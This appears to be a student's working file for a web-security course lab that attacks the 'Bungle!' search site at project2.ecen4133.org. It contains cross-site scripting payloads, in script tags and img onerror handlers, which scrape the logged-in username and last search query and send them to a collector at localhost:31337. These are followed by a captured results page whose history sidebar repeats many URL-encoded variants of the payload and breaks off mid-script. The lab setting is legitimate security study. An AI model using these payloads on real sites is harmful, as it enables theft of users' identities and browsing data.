<script>alert("yodobashi camera")</script>

<script>
    $.get("https://project2.ecen4133.org/search?xssdefense=0", function (data) {
        re = /<span id="logged-in-user">.*<\/span>/;
        var results = re.exec(data);
        var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');
        re = /<a href="search\?q=.*<\/a>/m;
        data = data.replace(re, '');
        results = re.exec(data);
        var last_search = results[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');
        console.log("LAST SEARCH: " + last_search);
        console.log(data);
        $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search, function (data) {
        });
    });
</script>
<IMG SRC=/ onerror="$.get('https://project2.ecen4133.org/search?xssdefense=0', function (data) { });"></img>

<IMG SRC=/ onerror="
    $.get('https://project2.ecen4133.org/search?xssdefense=0', function (data) {
        re = /<span id="logged-in-user">.*<\/span>/;
        var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');

        re = /<a href="search\?q=.*<\/a>/m;
        var last_search = re.exec(data)[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');

        $.get('http://localhost:31337/?stolen_user=' + username + '&last_search=' + last_search);
    });
"></img>

%alert(v.user)

<!DOCTYPE html>
<html>
  <head>
    <title>Search Results</title>
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" media="screen">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
    <style>
      .navbar-inner {
          float: none;
          margin: 0 auto;
          display: table;
          table-layout: fixed;
      }
      .container {
          max-width: none !important;
          width: 800px;
          min-width: 800px;
      }
      .navbar { margin: 0; }
      .main { margin-top: 15px; }
      #logged-in-user { font-weight: bold; }
      .navbar-inverse form { color: #999; }
      h3 { margin-top: 0px; }
      h4 { margin-top: 5px; }
      .search-well {
          width: 475px;
          margin: 60px auto 60px auto;
          text-align: center;
      }
      .search-field { width: 300px; }
      .form-space { margin: 5px 0; }
      .form-more-space { margin: 15px 0 5px 0; }
      .well p { margin: 0 0 5px 0; }
      #query-lbl { color: red; }
      #searchcontrol { margin-bottom: 15px; }
    </style>
    <script>
      function applyDefenses(){
        $('#location').val(document.location);
        $('#setdefenses').submit();
      }
      $(function(){
        $('#xssdefense').change(applyDefenses);
        $('#csrfdefense').change(applyDefenses);
      });
    </script>
  </head>
  <body>

    <!-- Defense selector navbar -->
    <div class="navbar navbar-default navbar-static-top">
      <div class="navbar-inner">
        <form id="setdefenses" action="./setdefenses" method="post" class="navbar-form">
          <div class="form-group">
            <label for="csrfdefense">CSRF:</label>
            <select name="csrfdefense" id="csrfdefense" style="width:auto" class="form-control input-sm"><option value=0 selected>0 - No defense</option><option value=1>1 - Token validation</option></select>
            <label for="xssdefense">XSS:</label>
            <select name="xssdefense" id="xssdefense" style="width:auto" class="form-control input-sm"><option value=0 selected>0 - No defense</option><option value=1>1 - Remove &quot;script&quot;</option><option value=2>2 - Remove several tags</option><option value=3>3 - Remove &quot; &apos; and ;</option><option value=4>4 - Encode &lt; and &gt;</option></select>&nbsp;
            <input id="location" name="location" type="hidden">
          </div>
        </form>
      </div>
    </div>

    <!-- Bungle navbar -->
    <div class="navbar navbar-inverse navbar-static-top">
      <div class="container">    
        <div class="navbar-header"> 
          <a id="bungle-lnk" class="navbar-brand" href="./">Bungle!</a>
        </div>
        <div class="nav navbar-nav navbar-right">
          <!-- Logout button -->
          <form action="./logout" method="post" class="navbar-form form-inline">
            Logged in as <span id="logged-in-user">miyo6032</span>.
            <input id="log-out-btn" type="submit" value="Log out" class="btn btn-link navbar-link">
          </form>
        </div>
      </div>
    </div>

    <div class="container main">

      <h3>Searching for <span id="query-lbl"></span></h3>
      <div class="row">
        <div class="col-xs-8">
          <p>Your search for <b></b> returned these results:</p>
          <div id="searchcontrol">No results found.</div>
          <p><a id="search-again-btn" href="./" class="btn btn-default">Search Again</a></p>
        </div>
        <div class="col-xs-4">

          <!-- History sidebar -->
          <div class="well">
            <h4>Search History</h4>
            <div id="history-list" class="list-group">
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20console.log%28results%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         console.log(results);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20console.log%28last_search%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         console.log(last_search);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20console.log%28last_search%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         console.log(last_search);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20console.log%28last_search%29%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         console.log(last_search)         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3D%22%20%2B%20last_search%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=&quot; + last_search, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results%5B0%5D.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results[0].replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20/%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E/m%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = /&lt;a href=&quot;search\?q=.*&lt;\/a&gt;/m;         var results = re.exec(data);         console.log(data);         var last_search = results.replace(&#039;&lt;a href=&quot;search\?q=&#039;, &#039;&#039;).replace(&#039;&lt;\/a&gt;&#039;, &#039;&#039;);         $.get(&quot;http://localhost:31337/?stolen_user=&quot; + username + &quot;&amp;last_search=test&quot;, function (data) {         });     }); &lt;/script&gt;</a>
              <a href="search?q=%3Cscript%3E%20%20%20%20%20%24.get%28%22https%3A//project2.ecen4133.org/search%3Fxssdefense%3D0%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Cspan%20id%3D%22logged-in-user%22%3E.%2A%3C%5C/span%3E%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20var%20username%20%3D%20results%5B0%5D.replace%28%27%3Cspan%20id%3D%22logged-in-user%22%3E%27%2C%20%27%27%29.replace%28%27%3C%5C/span%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20re%20%3D%20new%20RegExp%28%27%3Ca%20href%3D%22search%5C%3Fq%3D.%2A%3C%5C/a%3E%27%2C%20%27m%27%29%3B%20%20%20%20%20%20%20%20%20var%20results%20%3D%20re.exec%28data%29%3B%20%20%20%20%20%20%20%20%20console.log%28data%29%3B%20%20%20%20%20%20%20%20%20var%20last_search%20%3D%20results.replace%28%27%3Ca%20href%3D%22search%5C%3Fq%3D%27%2C%20%27%27%29.replace%28%27%3C%5C/a%3E%27%2C%20%27%27%29%3B%20%20%20%20%20%20%20%20%20%24.get%28%22http%3A//localhost%3A31337/%3Fstolen_user%3D%22%20%2B%20username%20%2B%20%22%26last_search%3Dtest%22%2C%20function%20%28data%29%20%7B%20%20%20%20%20%20%20%20%20%7D%29%3B%20%20%20%20%20%7D%29%3B%20%3C/script%3E" class="history-item list-group-item">&lt;script&gt;     $.get(&quot;https://project2.ecen4133.org/search?xssdefense=0&quot;, function (data) {         re = new RegExp(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;.*&lt;\/span&gt;&#039;);         var results = re.exec(data);         var username = results[0].replace(&#039;&lt;span id=&quot;logged-in-user&quot;&gt;&#039;, &#039;&#039;).replace(&#039;&lt;\/span&gt;&#039;, &#039;&#039;);         re = new RegExp(&#039;&lt;a href=&quot;search\?q=.*&lt;\/a&gt;&#039;, &#039;m&#039;);         var results = re.exec(data);         console.log(data);         var last_search = 